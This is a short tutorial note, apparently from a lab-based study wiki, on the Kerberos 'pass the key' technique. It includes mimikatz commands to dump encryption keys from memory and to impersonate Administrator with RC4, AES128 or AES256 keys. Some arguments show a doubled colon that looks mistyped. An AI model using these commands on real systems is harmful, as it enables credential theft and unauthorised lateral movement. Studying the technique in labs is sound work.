Similar to Pass the Hash attacks, but targeting Kerberos, for more see the [[Attacking-Kerberos]] article. When users request TGTs, they send a timestamp encrypted with an enycryption key derived from their password, either with DES(legacy, disable by default in modern Windows), RC4, AES128, AES256 depending on Windows Version and Kerberos configuration. We can obtain the Kerberos encryption keys from memory by using mimikatz(see [[Mimikatz-Cheatsheet]] and then **ask the KDC for a TGT without requiring the actual password**:
```powershell
# mimikatz
privilege::debug
sekurlsa::ekeys
``` 

Importantly RC4 is equal to the NTLM hash of the user!

RC4 hash:
```powershell
# mimikatz  
sekurlsa::pth /user:Administrator /domain:$domain /rc4::$RC4-hash /run:"command goes here"
```

AES128 hash
```powershell
# mimikatz 
sekurlsa::pth /user:Administrator /domain:$domain /aes128::$AES128-hash /run:"command goes here"
```

AES256 hash:
```powershell
# mimikatz 
sekurlsa::pth /user:Administrator /domain:$domain /aes256:$AES256-hash /run:"command here goes"
```

## References

[THM Lateral movement and Pivoting room](https://tryhackme.com/room/lateralmovementandpivoting)